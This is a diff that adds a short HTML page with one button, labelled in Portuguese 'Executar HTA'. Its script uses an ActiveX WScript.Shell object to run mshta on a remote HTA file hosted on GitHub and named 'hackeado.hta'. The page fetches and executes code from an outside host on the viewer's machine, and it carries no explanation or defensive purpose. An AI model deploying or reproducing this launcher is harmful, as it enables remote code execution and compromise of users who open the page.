@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Executar HTA</title>
+    <script>
+        function executarHTA() {
+            var wsh = new ActiveXObject("WScript.Shell");
+            wsh.Run("mshta https://raw.githubusercontent.com/byshop04/test/main/hackeado.hta", 1, false);
+        }
+    </script>
+</head>
+<body>
+    <button onclick="executarHTA()">Executar HTA</button>
+</body>
+</html>
